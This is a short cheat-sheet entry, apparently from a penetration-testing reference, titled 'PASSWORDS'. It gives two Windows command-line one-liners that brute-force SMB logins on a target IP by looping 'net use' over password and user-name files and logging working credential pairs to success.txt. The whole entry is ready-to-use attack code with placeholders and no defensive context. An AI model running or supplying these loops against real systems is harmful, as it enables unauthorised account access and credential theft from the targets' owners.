# PASSWORDS

Password guessing or checks:

```bash
for /f %i in (<PASSWORD FILE NAME>.txt) do
@echo %i & net use \\<TARGET IP ADDRESS> %i /u:<USER
NAME> 2>nul && pause

for /f %i in (<USER NAME FILE>.txt) do @(for /f %j
in (<PASSWORD FILE NAME>.txt) do @echo %i:%j & @net
use \\<TARGET IP ADDRESS> %j /u:%i 2>nul &&
echo %i:%j >> success.txt && net use \\<IP ADDRESS>
/del)
```
